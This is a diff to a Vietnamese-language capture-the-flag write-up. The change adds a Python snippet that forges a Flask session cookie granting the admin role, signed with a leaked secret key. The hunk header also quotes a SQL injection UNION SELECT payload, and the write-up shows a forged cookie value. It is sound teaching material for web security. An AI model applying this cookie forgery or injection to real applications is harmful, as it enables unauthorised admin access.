@@ -72,14 +72,33 @@ UNION SELECT name, value, NULL, NULL, NULL FROM settings -- \
 Giờ ta đã có `private_key`, điều còn lại cần làm đơn giản là kí data giả và lấy về flag thôi
 
 ## Kí Flask session cookie
-Có thể dùng command ở trên để kí hoặc dùng tool trên internet.
+Có thể dùng command ở trên để kí, code python hoặc dùng tool trên internet.
 1. command
 ![image](https://hackmd.io/_uploads/BJTuB9esGg.png)
 -> Session cookie: 
 ```
 eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.asMVXw.2Q_qJNCy277nAxAmqxtk1Faeak4
 ```
-2. online tool ([Key Decryptor](https://keydecryptor.com/decryption-tools/flask-cookie))
+2.  code python
+```python
+from itsdangerous import URLSafeTimedSerializer
+from flask.sessions import TaggedJSONSerializer
+import hashlib
+
+secret_key = "078185b423f8fd5a1b8f0bd78576c14389b55cda024322da499a6ca7cc00cfd6"
+
+serializer = URLSafeTimedSerializer(
+    secret_key,
+    salt='cookie-session',
+    serializer=TaggedJSONSerializer(),
+    signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
+)
+
+data = {"role": "admin", "username": "admin"}
+forged_cookie = serializer.dumps(data)
+print(forged_cookie)
+```
+3. online tool ([Key Decryptor](https://keydecryptor.com/decryption-tools/flask-cookie))
 ![image](https://hackmd.io/_uploads/rJri8cxofl.png)
 -> Session cookie: 
 ```
